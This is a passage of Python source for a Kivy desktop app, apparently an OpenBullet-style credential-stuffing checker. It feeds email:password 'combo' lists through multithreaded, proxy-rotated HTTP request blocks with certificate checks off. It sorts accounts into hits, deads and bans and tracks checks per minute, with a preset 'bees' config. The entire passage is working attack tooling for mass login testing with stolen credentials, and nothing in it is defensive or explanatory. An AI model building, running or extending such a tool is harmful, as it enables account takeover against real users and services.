                return exceptions.ReadTimeout
            except exceptions.ConnectionError:
                self.response_codes[block] = 404
                self.schedule_update_labels(self.result_logs_box.children[0].children[0], self.result_logs_labels, f"\nConnection Error in POST [{block}]")
                return
            except exceptions.InvalidURL:
                self.response_codes[block] = 404
                self.schedule_update_labels(self.result_logs_box.children[0].children[0], self.result_logs_labels, f"\nInvalid URL in POST [{block}]")
                return
            except exceptions.TooManyRedirects:
                self.response_codes[block] = 404
                self.schedule_update_labels(self.result_logs_box.children[0].children[0], self.result_logs_labels, f"\nToo Many Redirects in POST [{block}]")
                return

        elif type_ == 'PUT':
            try: response = self.my_session.put(url, data=content_data, proxies=self.proxyDict, headers=headers, timeout=self.timeout_n, verify=False, allow_redirects=is_redirect == 'TRUE')
            except exceptions.ReadTimeout:
                self.schedule_update_labels(self.result_logs_box.children[0].children[0], self.result_logs_labels, f"\nTimeout Error in PUT [{block}]")
                return exceptions.ReadTimeout
            except exceptions.ConnectionError:
                self.response_codes[block] = 404
                self.schedule_update_labels(self.result_logs_box.children[0].children[0], self.result_logs_labels, f"\nConnection Error in PUT [{block}]")
                return
            except exceptions.InvalidURL:
                self.response_codes[block] = 404
                self.schedule_update_labels(self.result_logs_box.children[0].children[0], self.result_logs_labels, f"\nInvalid URL in PUT [{block}]")
                return
            except exceptions.TooManyRedirects:
                self.response_codes[block] = 404
                self.schedule_update_labels(self.result_logs_box.children[0].children[0], self.result_logs_labels, f"\nToo Many Redirects in PUT [{block}]")
                return

        elif type_ == 'DELETE':
            try: response = self.my_session.delete(url, proxies=self.proxyDict, headers=headers, timeout=self.timeout_n, verify=False, allow_redirects=is_redirect == 'TRUE')
            except exceptions.ReadTimeout:
                self.schedule_update_labels(self.result_logs_box.children[0].children[0], self.result_logs_labels, f"\nTimeout Error in DELETE [{block}]")
                return exceptions.ReadTimeout
            except exceptions.ConnectionError:
                self.response_codes[block] = 404
                self.schedule_update_labels(self.result_logs_box.children[0].children[0], self.result_logs_labels, f"\nConnection Error in DELETE [{block}]")
                return
            except exceptions.InvalidURL:
                self.response_codes[block] = 404
                self.schedule_update_labels(self.result_logs_box.children[0].children[0], self.result_logs_labels, f"\nInvalid URL in DELETE [{block}]")
                return
            except exceptions.TooManyRedirects:
                self.response_codes[block] = 404
                self.schedule_update_labels(self.result_logs_box.children[0].children[0], self.result_logs_labels, f"\nToo Many Redirects in DELETE [{block}]")
                return

        if response != None:
            # Save the response in dictionaries for later use in other blocks    
            self.responses[block] = response.text
            self.headers[block] = response.headers
            self.cookies[block] = response.cookies
            self.response_codes[block] = response.status_code
            self.urls[block] = response.url
            self.schedule_update_labels(self.result_logs_box.children[0].children[0], self.result_logs_labels, f"\n{block} - Response Code: {response.status_code}")

    def handle_set(self, params):
        """
        Set a value to a variable for later use, RND and LENGTH functions are supported.
        
        :param params: Dictionary containing variable name and value.
        """

        # Get the variable name and value
        variable_name = params.get('VAR')
        value = params.get('VALUE')

        if not variable_name or value is None:
            self.schedule_update_labels(self.result_logs_box.children[0].children[0], self.result_logs_labels, "\nVariable name or value not provided")
            return
        
        # Replace placeholders in the value string
        value = self._replace_variables(value)
        if value == None:
            return
        
        # Replace RND functions in the value string
        value = self._random_string(value)

        # Replace LENGTH functions in the value string
        value = self._length_string(value)

        # Save the variable in a dictionary for later use in other blocks
        self.variables[variable_name] = value
        self.schedule_update_labels(self.result_logs_box.children[0].children[0], self.result_logs_labels, f"\nSET ({variable_name}) - {value}")

    def handle_find(self, params):
        """
        Find a substring between two delimiters.
        
        :param params: Dictionary containing the variable name, delimiters, and block.
        """

        # Get the variable name, delimiters, and block
        block = params.get('BLOCK')
        variable_name = params.get('VAR')
        first_delimiter = params.get('FIRST')
        last_delimiter = params.get('LAST')

        # Check if the variable name and delimiters are provided
        if not variable_name or not variable_name:
            self.schedule_update_labels(self.result_logs_box.children[0].children[0], self.result_logs_labels, "\nVariable name or pattern not provided")
            return
        
        # Replace placeholders in the variable name string
        if "<" in variable_name:
            variable_name = self._extract_substring(variable_name, "<", ">")
            if "text" in variable_name:
                variable_value = str(self.responses.get(variable_name[:-5]))
            elif "headers" in variable_name:
                variable_value = str(self.headers.get(variable_name[:-8]))
            elif "cookies" in variable_name:
                variable_value = str(self.cookies.get(variable_name[:-8]))
            elif variable_name == "EMAIL":
                variable_value = str(self.email)
            else:
                variable_value = str(self.variables.get(variable_name))
        else:
            if "text" in variable_name:
                variable_value = str(self.responses.get(variable_name[:-5]))
            elif "headers" in variable_name:
                variable_value = str(self.headers.get(variable_name[:-8]))
            else:
                variable_value = "Not Found"
                result = extract_substring(variable_value, first_delimiter, last_delimiter)
                self.variables[block] = result
                self.add_text_to_labels(self.result_logs_box.children[0].children[0], self.result_logs_labels, f"\nFIND {variable_name} - {result}")
                return
        
        # Check if the variable exists
        result = extract_substring(variable_value, first_delimiter, last_delimiter)
        if result == "":
            result = "Not Found"
        self.variables[block] = result

        self.schedule_update_labels(self.result_logs_box.children[0].children[0], self.result_logs_labels, f"\nFIND ({variable_name}) - {result}")

    def handle_print(self, params):
        """
        Print the content of a variable.
        """
        variable_name = params.get('VAR')

        if not variable_name:
            self.schedule_update_labels(self.result_logs_box.children[0].children[0], self.result_logs_labels, "\nVariable name not provided")
            return

        # Replace placeholders in the variable name string
        if "<" in variable_name:
            variable_name = self._extract_substring(variable_name, "<", ">")
            if "text" in variable_name:
                content = str(self.responses.get(variable_name[:-5]))
            elif "headers" in variable_name:
                content = self.headers.get(variable_name[:-8])
            elif "cookies" in variable_name:
                content = self.cookies.get(variable_name[:-8])
            elif variable_name == "EMAIL":
                content = self.email
            else:
                content = self.variables.get(variable_name)
            self._print_content(variable_name, content)
        elif "text" in variable_name:
            content = str(self.responses.get(variable_name[:-5]))
            self._print_content(variable_name, content)
        elif "headers" in variable_name:
            content = str(self.headers.get(variable_name[:-8]))
            self._print_content(variable_name, content)
        else:
            self.add_text_to_labels(self.result_logs_box.children[0].children[0], self.result_logs_labels, f"\nVariable {variable_name} not Found")
            return
        
    def _print_content(self, variable_name, content):
        """
        Print the content of a variable in chunks.

        :param variable_name: The name of the variable.
        :param content: The content of the variable.
        """

        if content:
            content_str = str(content)
            if len(content_str) > 1000:
                chunks = [content_str[i: i + 1000] for i in range(0, len(content_str), 1000)]
                for chunk in chunks:
                    self.schedule_update_labels(self.result_logs_box.children[0].children[0], self.result_logs_labels, f"\nPRINT [{variable_name}] - {chunk}")
            else:
                self.schedule_update_labels(self.result_logs_box.children[0].children[0], self.result_logs_labels, f"\nPRINT [{variable_name}] - {content_str}")
        else:
            self.schedule_update_labels(self.result_logs_box.children[0].children[0], self.result_logs_labels, f"\nPRINT [{variable_name}] - Not Found")

    @staticmethod
    def _extract_substring(input_string, start_delimiter, end_delimiter):
        """Extract a substring between two delimiters."""
        try:
            start = input_string.index(start_delimiter) + len(start_delimiter)
            end = input_string.index(end_delimiter, start)
            return input_string[start:end]
        except ValueError:
            return ""

    def _length_string(self, value):
        """
        Replace LENGTH functions in the given value string with the length of the specified variable.
        """

        # Check if the value contains LENGTH functions
        if "LENGTH" in value:

            # Define the regular expression pattern for LENGTH functions
            pattern = re.compile(r'LENGTH\((.*?)\)')
            matches = re.findall(pattern, value)
            
            for match in matches:
                # Split the LENGTH function parameters
                length_params = match.split(',')
                variable_name = length_params[0].split('>')[1]
                variable_content = self._replace_variables(variable_name)
                if variable_content == None:
                    return

                value = value.replace(f"LENGTH({match})", str(len(variable_content)), 1)

        return value

    def _random_string(self, value):
        """
        Replace RND functions in the given value string with random strings.
        """

        # Check if the value contains RND functions
        if "RND" in value:
            # Define the regular expression pattern for RND functions
            pattern = re.compile(r'RND\((.*?)\)')
            matches = re.findall(pattern, value)
            
            for match in matches:
                # Split the RND function parameters
                rnd_params = match.split(',')
                rnd_length = rnd_params[0].split('>')[1]
                rnd_chars = rnd_params[1].split('>')[1]
                rnd_string = ''.join(random.choice(rnd_chars) for _ in range(int(rnd_length)))
                value = value.replace(f"RND({match})", rnd_string, 1)

        return value

    def worker(self, task_queue, selected_option):
        """Worker thread that processes the instructions."""
        # Keep running until the queue is empty
        while True:
            self.pause_event.wait()
            if task_queue.empty():
                break
            acc = task_queue.get()
            try: email, passwordO = acc.split(':')
            except ValueError:
                email = "NULL123456@gmail.com"
                passwordO = "NULL123456"
            if self.proxies != "":
                proxy = set()
                file_lines1 = self.proxies.split('\n')
                for line1 in file_lines1:
                    proxy.add(line1.strip())
                proxyDict = self.parse_proxy(random.choice(list(proxy)), self.proxy_spinner.text.swapcase())
            else: proxyDict=None
            if selected_option == "Bees":
                if self.loaded_config == False:
                    self.loaded_config = True
                    self._load_selected_instructions(self, selected_file="configs/bees.txt")
                result = self.run_custom_instructions(email, passwordO, proxyDict)
            elif selected_option == "Custom":
                result = self.run_custom_instructions(email, passwordO, proxyDict)
            if not result:
                self.schedule_update_labels(self.result_logs_box.children[0].children[0], self.result_logs_labels, f"\n[*] Combo Finished!")
                self.stop_file(self.run_button, True)
                return
            elif "You must load instructions first!" in result:
                self.schedule_update_labels(self.result_logs_box.children[0].children[0], self.result_logs_labels, f"\n[*] You must load instructions first!")
                return
            elif result:
                self.update_gui(result)
                progress = (self.progreso + 1) / self.total_instructions * 100
                self.progress_bar.value += progress
            if "Timeout" not in result: self.check_times.append(time.time())
            self.worker_threads_running -= 1  # Decrement the count of running threads
            task_queue.task_done()
        
    def update_cpm(self, dt=None):
        current_time = time.time()
        # Remove all the times that are older than 60 seconds
        self.check_times = [t for t in self.check_times if current_time - t < 60]
        cpm = len(self.check_times)
        self.update_info_label(self.cpm_label, f"CPM: {cpm}")

    def update_time(self, dt=None): 
        # Update the time label 
        self.seconds += 1
        hours, remainder = divmod(self.seconds, 3600)
        minutes, seconds = divmod(remainder, 60)
        self.update_info_label(self.time_label, f"{hours:02}:{minutes:02}:{seconds:02}")

    def update_info_label(self, label, update):
        # Update the label with the given text
        if "Hits" in label.text: 
            self.modify_line(self.hits_labels, 0, f"Hits: {str(update)}")
        elif "Deads" in label.text:
            self.modify_line(self.deads_labels,0, f"Deads: {str(update)}")
        else:
            label.text = str(update)

    def check_threads_finished(self, dt):
        # Check if all the threads have finished
        if self.worker_threads_running == 0:
            print("Threads Finished")
        if self.progress_bar.value == 100 and self.impreso == False:
            self.impreso = True
            self.state_label.text = "State: Sleeping"
            self.schedule_update_labels(self.result_logs_box.children[0].children[0], self.result_logs_labels, f"\n[*] Combo Finished!")
            self.stop_file(self.run_button, True)

    def update_gui(self, result):
        def update(dt):
            if result == None:
                return
            if "| HIT" in result:
                self.hits_count += 1
                self.update_info_label(self.hits_labels[0], self.hits_count)
                self.schedule_update_labels(self.result_hits_box.children[0].children[0], self.hits_labels, result)
            elif "| DEAD" in result:
                self.deads_count += 1
                self.update_info_label(self.deads_labels[0], self.deads_count)
                self.schedule_update_labels(self.result_deads_box.children[0].children[0], self.deads_labels, result)
            elif "| TOCHECK" in result:
                self.hits_count += 1
                self.update_info_label(self.hits_labels[0], self.hits_count)
                self.schedule_update_labels(self.result_hits_box.children[0].children[0], self.hits_labels, result)
            elif "| BAN" in result:
                self.schedule_update_labels(self.result_logs_box.children[0].children[0], self.result_logs_labels, result)
            else:
                self.schedule_update_labels(self.result_logs_box.children[0].children[0], self.result_logs_labels, result)
        Clock.schedule_once(update)

    def stop_file(self, instance, is_finished=False):
        if self.is_paused:
            self.is_paused = False
            self.pause_event.set()
            self.run_button.text = "Stop"
            self.run_button.background_color = (1, 0, 0, 1) 
            self.state_label.text = "State: Running"
            self.schedule_update_labels(self.result_logs_box.children[0].children[0], self.result_logs_labels, f"\n[*] Combo Resumed!")
            Clock.schedule_interval(self.update_cpm, 1)
            Clock.schedule_interval(self.update_time, 1)
        elif is_finished:
            self.is_paused = False
            self.run_button.text = "Run"
            self.run_button.unbind(on_press=self.stop_file)
            self.run_button.bind(on_press=self.run_file)
            self.run_button.background_color = (0, 1, 0, 1)
            self.state_label.text = "State: Sleeping"
            self.schedule_update_labels(self.result_logs_box.children[0].children[0], self.result_logs_labels, f"\n[*] Combo Finished!")
            Clock.unschedule(self.update_time)
            Clock.unschedule(self.update_cpm)
        else:
            self.is_paused = True
            self.pause_event.clear()
            self.run_button.text = "Resume"
            self.run_button.background_color = (0, 1, 0, 1)
            self.state_label.text = "State: Paused"
            self.schedule_update_labels(self.result_logs_box.children[0].children[0], self.result_logs_labels, f"\n[*] Combo Paused!")
            Clock.unschedule(self.update_time)
            Clock.unschedule(self.update_cpm)

    def run_file(self, instance):
        """
        Run the loaded combo and proxies.
        """

        # Reset the variables
        self.loaded_config = False
        self.seconds = 0
        self.check_times = []
        try:
            if not self.deads_count:
                self.deads_count = 0
        except AttributeError:
            self.deads_count = 0 
            self.hits_count = 0
        self.impreso = False
        self.state_label.text = "State: Running"
        self.progress_bar.value = 0
        selected_option = self.options_spinner.text

        if self.is_stopping == True:
            return

        # Check if the combo and proxies are loaded and the threads number is valid
        if self.proxies == "" and self.proxies_button.disabled == False:
            self.schedule_update_labels(self.result_logs_box.children[0].children[0], self.result_logs_labels, f"\n[*] You must load Proxies!")
            self.state_label.text = "State: Sleeping"
            return

        if self.combo == "":
            self.state_label.text = "State: Sleeping"
            self.schedule_update_labels(self.result_logs_box.children[0].children[0], self.result_logs_labels, f"\n[*] You must load a Combo!")
            return

        try: self.threads = int(self.threads_input.text)
        except ValueError:
            self.state_label.text = "State: Sleeping"
            self.schedule_update_labels(self.result_logs_box.children[0].children[0], self.result_logs_labels, f"\n[*] Invalid Threads Number!")
            return

        self.run_button.text = "Stop"
        self.run_button.background_color = (1, 0, 0, 1)
        self.run_button.unbind(on_press=self.run_file)
        self.run_button.bind(on_press=self.stop_file)

        try: self.start_n = int(self.start_input.text)
        except AttributeError: self.start_n = 0

        # Start the timer and CPM counter
        Clock.schedule_interval(self.update_cpm, 1)
        Clock.schedule_interval(self.update_time, 1)

        # Get the accounts from the combo
        accsLista = []
        acssLines = self.combo.split('\n')[self.start_n:]
        for line in acssLines:
            accsLista.append(line.strip())

        # Create the task queue and result queue
        self.result_queue = Queue()
        self.worker_threads_running = 0
        self.task_queue = Queue()
        
        # Put the accounts in the task queue
        for acc in acssLines:
            self.task_queue.put(acc)
        self.total_instructions = self.task_queue.qsize()
        proxy = set()
        file_lines1 = self.proxies.split('\n')
        for line1 in file_lines1:
            proxy.add(line1.strip())

        # Start the worker threads
        self.worker_threads = []
        for _ in range(self.threads):
            self.worker_threads_running += 1  # Increment the count of running threads
            thread = Thread(target=self.worker, args=(self.task_queue, selected_option))
            self.worker_threads.append(thread)
            thread.start()

        Clock.schedule_interval(self.check_threads_finished, 1)

        return

class BulletApp(App):
    def build(self): return ScreenManagement()

if __name__ == '__main__':
    BulletApp().run()
